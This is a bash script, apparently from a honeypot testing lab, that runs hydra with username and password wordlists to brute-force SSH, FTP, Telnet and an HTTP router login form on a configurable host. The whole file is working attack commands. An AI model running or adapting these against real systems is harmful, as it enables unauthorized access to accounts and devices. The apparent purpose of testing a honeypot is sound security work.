#!/usr/bin/env bash
# =============================================================================
# Computer 3 — 02_bruteforce.sh
# Brute-forces SSH, FTP, Telnet, and HTTP login panels with hydra.
# Uses scripts/wordlists/users.txt + passwords.txt.
# =============================================================================
set -uo pipefail
cd "$(dirname "$0")/.."
[ -f .env ] && set -a && . ./.env && set +a
HOST="${HONEYPOT_HOST:-192.168.1.10}"
U="scripts/wordlists/users.txt"
P="scripts/wordlists/passwords.txt"
OUT="results/02_bruteforce"
mkdir -p results

echo "[+] Hydra SSH (${HOST}:${SSH_PORT:-2222})..."
hydra -L "$U" -P "$P" -s "${SSH_PORT:-2222}" -f -o "${OUT}_ssh.txt" "${HOST}" ssh 2>&1 | tee "${OUT}_ssh.log" || true

echo ""
echo "[+] Hydra FTP (${HOST}:${FTP_PORT:-2121})..."
hydra -L "$U" -P "$P" -s "${FTP_PORT:-2121}" -f -o "${OUT}_ftp.txt" "${HOST}" ftp 2>&1 | tee "${OUT}_ftp.log" || true

echo ""
echo "[+] Hydra Telnet (${HOST}:${TELNET_PORT:-2323})..."
hydra -L "$U" -P "$P" -s "${TELNET_PORT:-2323}" -f -t 4 -o "${OUT}_telnet.txt" "${HOST}" telnet 2>&1 | tee "${OUT}_telnet.log" || true

echo ""
echo "[+] Hydra HTTP-POST-FORM on router panel (${HOST}:${ROUTER_PORT:-8085}/login)..."
hydra -L "$U" -P "$P" -s "${ROUTER_PORT:-8085}" -f \
  "${HOST}" http-post-form \
  "/login:u=^USER^&p=^PASS^:Bad credentials" \
  -o "${OUT}_http_router.txt" 2>&1 | tee "${OUT}_http_router.log" || true

echo "[+] Done. Results in results/${OUT}_*"
